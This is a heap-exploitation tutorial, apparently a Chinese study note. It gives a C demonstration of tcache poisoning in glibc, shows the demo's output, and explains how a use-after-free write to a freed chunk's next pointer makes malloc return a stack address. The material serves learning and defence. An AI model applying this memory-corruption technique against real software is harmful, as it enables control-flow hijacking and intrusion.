```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>

int main()
{
	// disable buffering
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	printf("This file demonstrates a simple tcache poisoning attack by tricking malloc into\n"
		   "returning a pointer to an arbitrary location (in this case, the stack).\n"
		   "The attack is very similar to fastbin corruption attack.\n");
	printf("After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n"
		   "We have to create and free one more chunk for padding before fd pointer hijacking.\n\n");

	size_t stack_var;
	printf("The address we want malloc() to return is %p.\n", (char *)&stack_var);

	printf("Allocating 2 buffers.\n");
	intptr_t *a = malloc(128);
	printf("malloc(128): %p\n", a);
	intptr_t *b = malloc(128);
	printf("malloc(128): %p\n", b);

	printf("Freeing the buffers...\n");
	free(a);
	free(b);

	printf("Now the tcache list has [ %p -> %p ].\n", b, a);
	printf("We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
		   "to point to the location to control (%p).\n", sizeof(intptr_t), b, &stack_var);
	b[0] = (intptr_t)&stack_var;
	printf("Now the tcache list has [ %p -> %p ].\n", b, &stack_var);

	printf("1st malloc(128): %p\n", malloc(128));
	printf("Now the tcache list has [ %p ].\n", &stack_var);

	intptr_t *c = malloc(128);
	printf("2nd malloc(128): %p\n", c);
	printf("We got the control\n");

	assert((long)&stack_var == (long)c);
	return 0;
}
```



```
This file demonstrates a simple tcache poisoning attack by tricking malloc into
returning a pointer to an arbitrary location (in this case, the stack).
The attack is very similar to fastbin corruption attack.
After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,
We have to create and free one more chunk for padding before fd pointer hijacking.

The address we want malloc() to return is 0x7ffd7c487e68.
Allocating 2 buffers.
malloc(128): 0x55c012b76260
malloc(128): 0x55c012b762f0
Freeing the buffers...
Now the tcache list has [ 0x55c012b762f0 -> 0x55c012b76260 ].
We overwrite the first 8 bytes (fd/next pointer) of the data at 0x55c012b762f0
to point to the location to control (0x7ffd7c487e68).
Now the tcache list has [ 0x55c012b762f0 -> 0x7ffd7c487e68 ].
1st malloc(128): 0x55c012b762f0
Now the tcache list has [ 0x7ffd7c487e68 ].
2nd malloc(128): 0x7ffd7c487e68
We got the control
```

这个 demo 演示的是有 tcache 的情况下的 use after free

先分配了两个符合 tcache 大小的 chunk

```c
	intptr_t *a = malloc(128);
    intptr_t *b = malloc(128);
```

然后 free 掉他们

```c
	free(a);
	free(b);
```

这个时候 a 和 b 都会进入同一条 tcache（一样大小的 chunk，tcache 也没有满）

![image-20201125003506465](https://gitee.com/scriptkiddies/images/raw/master/image-20201125003506465.png)

![image-20201125003723919](https://gitee.com/scriptkiddies/images/raw/master/image-20201125003723919.png)

tcache 中的 chunk 的 next 指针域是位于 chunk 的 fd 的位置，所以，b 的  next 字段指向的是 a

当 free b 后不把 b 置 NULL，还是可以向 b 所指的区域写入，而写入的东西会覆盖位于 tcache 中的 b chunk 的 next 指针，我们把 stack_var 的地址写上去

![image-20201125004329186](https://gitee.com/scriptkiddies/images/raw/master/image-20201125004329186.png)

就会导致 stack_var 被放入 tcache 链中，2.27 的 glibc 从 tcache 中取出 chunk 是没有任何检查的，然后只要再 malloc 两次就能得到 stack_var 的地址

```
Now the tcache list has [ 0x5555555592f0 -> 0x7fffffffdf18 ].
1st malloc(128): 0x5555555592f0
Now the tcache list has [ 0x7fffffffdf18 ].
2nd malloc(128): 0x7fffffffdf18
We got the control
```

